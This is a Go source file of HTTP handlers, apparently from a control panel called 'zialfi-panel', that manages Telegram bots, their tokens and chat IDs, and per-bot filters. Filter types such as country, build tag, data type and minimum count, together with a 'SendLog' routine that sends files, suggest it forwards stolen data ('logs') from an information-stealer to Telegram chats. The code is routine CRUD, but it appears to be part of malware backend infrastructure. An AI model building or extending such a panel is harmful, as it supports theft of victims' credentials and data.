package api

import (
	"database/sql"
	"encoding/json"
	"net/http"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"zialfi-panel/internal/services"
	"zialfi-panel/internal/db"
)

type TelegramBotHandler struct {
	db *sql.DB
	provider db.ProviderType
}

func NewTelegramBotHandler(db *sql.DB, provider db.ProviderType) *TelegramBotHandler {
	return &TelegramBotHandler{db: db, provider: provider}
}

func (h *TelegramBotHandler) List(w http.ResponseWriter, r *http.Request) {
	claims := claimsFromCtx(r)
	isAdmin := claims != nil && claims.Role == "admin"

	rows, err := db.Query(h.db, h.provider, `SELECT id, name, token, chat_id, COALESCE(tier,'basic'), is_active, created_at FROM telegram_bots ORDER BY created_at DESC`)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query bots")
		return
	}
	defer rows.Close()

	type botEntry struct {
		ID        string `json:"id"`
		Name      string `json:"name"`
		Token     string `json:"token,omitempty"`
		ChatID    string `json:"chat_id"`
		Tier      string `json:"tier"`
		IsActive  bool   `json:"is_active"`
		CreatedAt string `json:"created_at"`
	}

	bots := make([]botEntry, 0)
	for rows.Next() {
		var b botEntry
		if err := rows.Scan(&b.ID, &b.Name, &b.Token, &b.ChatID, &b.Tier, &b.IsActive, &b.CreatedAt); err != nil {
			continue
		}
		if !isAdmin && len(b.Token) > 8 {
			b.Token = b.Token[:4] + "****" + b.Token[len(b.Token)-4:]
		}
		bots = append(bots, b)
	}

	writeJSON(w, http.StatusOK, bots)
}

func (h *TelegramBotHandler) Create(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Name   string `json:"name"`
		Token  string `json:"token"`
		ChatID string `json:"chat_id"`
		Tier   string `json:"tier"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	if body.Name == "" || body.Token == "" || body.ChatID == "" {
		writeError(w, http.StatusBadRequest, "name, token, and chat_id are required")
		return
	}
	if body.Tier == "" {
		body.Tier = "basic"
	}

	proxy := services.NewTelegramProxy()
	if err := proxy.TestToken(body.Token); err != nil {
		writeError(w, http.StatusBadRequest, "invalid telegram token")
		return
	}

	id := uuid.New().String()
	_, err := db.Exec(h.db, h.provider, 
		`INSERT INTO telegram_bots (id, name, token, chat_id, tier, is_active) VALUES (?, ?, ?, ?, ?, 1)`,
		id, body.Name, body.Token, body.ChatID, body.Tier,
	)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create bot")
		return
	}

	writeJSON(w, http.StatusCreated, map[string]any{
		"id":        id,
		"name":      body.Name,
		"chat_id":   body.ChatID,
		"tier":      body.Tier,
		"is_active": true,
	})
}

func (h *TelegramBotHandler) Update(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing bot id")
		return
	}

	var body struct {
		IsActive *bool `json:"is_active"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	if body.IsActive == nil {
		writeError(w, http.StatusBadRequest, "is_active is required")
		return
	}

	result, err := db.Exec(h.db, h.provider, "UPDATE telegram_bots SET is_active = ? WHERE id = ?", *body.IsActive, id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to update bot")
		return
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		writeError(w, http.StatusNotFound, "bot not found")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{"id": id, "is_active": *body.IsActive})
}

func (h *TelegramBotHandler) Delete(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing bot id")
		return
	}

	tx, err := h.db.Begin()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to begin transaction")
		return
	}
	defer tx.Rollback()

	tx.Exec("DELETE FROM bot_filters WHERE bot_id = ?", id)
	result, err := tx.Exec("DELETE FROM telegram_bots WHERE id = ?", id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to delete bot")
		return
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		writeError(w, http.StatusNotFound, "bot not found")
		return
	}

	if err := tx.Commit(); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to commit")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{"deleted": true})
}

func (h *TelegramBotHandler) Test(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing bot id")
		return
	}

	var token, chatID string
	err := db.QueryRow(h.db, h.provider, "SELECT token, chat_id FROM telegram_bots WHERE id = ?", id).Scan(&token, &chatID)
	if err == sql.ErrNoRows {
		writeError(w, http.StatusNotFound, "bot not found")
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to fetch bot")
		return
	}

	proxy := services.NewTelegramProxy()
	err = proxy.SendLog(token, chatID, []byte("Mirage test message"), "test.txt", "Test notification from Mirage")
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to send test message")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{"sent": true})
}

func (h *TelegramBotHandler) ListFilters(w http.ResponseWriter, r *http.Request) {
	botID := chi.URLParam(r, "id")
	if botID == "" {
		writeError(w, http.StatusBadRequest, "missing bot id")
		return
	}

	rows, err := db.Query(h.db, h.provider, `SELECT id, bot_id, filter_type, filter_value, created_at FROM bot_filters WHERE bot_id = ? ORDER BY created_at`, botID)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query filters")
		return
	}
	defer rows.Close()

	type filterEntry struct {
		ID          string `json:"id"`
		BotID       string `json:"bot_id"`
		FilterType  string `json:"filter_type"`
		FilterValue string `json:"filter_value"`
		CreatedAt   string `json:"created_at"`
	}

	filters := make([]filterEntry, 0)
	for rows.Next() {
		var f filterEntry
		if err := rows.Scan(&f.ID, &f.BotID, &f.FilterType, &f.FilterValue, &f.CreatedAt); err != nil {
			continue
		}
		filters = append(filters, f)
	}

	writeJSON(w, http.StatusOK, filters)
}

func (h *TelegramBotHandler) CreateFilter(w http.ResponseWriter, r *http.Request) {
	botID := chi.URLParam(r, "id")
	if botID == "" {
		writeError(w, http.StatusBadRequest, "missing bot id")
		return
	}

	var body struct {
		FilterType  string `json:"filter_type"`
		FilterValue string `json:"filter_value"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	if body.FilterType == "" || body.FilterValue == "" {
		writeError(w, http.StatusBadRequest, "filter_type and filter_value are required")
		return
	}

	validTypes := map[string]bool{"country": true, "build_tag": true, "data_type": true, "min_count": true}
	if !validTypes[body.FilterType] {
		writeError(w, http.StatusBadRequest, "invalid filter_type (must be: country, build_tag, data_type, min_count)")
		return
	}

	id := uuid.New().String()
	_, err := db.Exec(h.db, h.provider, 
		`INSERT INTO bot_filters (id, bot_id, filter_type, filter_value) VALUES (?, ?, ?, ?)`,
		id, botID, body.FilterType, body.FilterValue,
	)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create filter")
		return
	}

	writeJSON(w, http.StatusCreated, map[string]any{"id": id, "bot_id": botID, "filter_type": body.FilterType, "filter_value": body.FilterValue})
}

func (h *TelegramBotHandler) DeleteFilter(w http.ResponseWriter, r *http.Request) {
	botID := chi.URLParam(r, "id")
	filterID := chi.URLParam(r, "filter_id")
	if botID == "" || filterID == "" {
		writeError(w, http.StatusBadRequest, "missing bot id or filter id")
		return
	}

	result, err := db.Exec(h.db, h.provider, "DELETE FROM bot_filters WHERE id = ? AND bot_id = ?", filterID, botID)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to delete filter")
		return
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		writeError(w, http.StatusNotFound, "filter not found")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{"deleted": true})
}
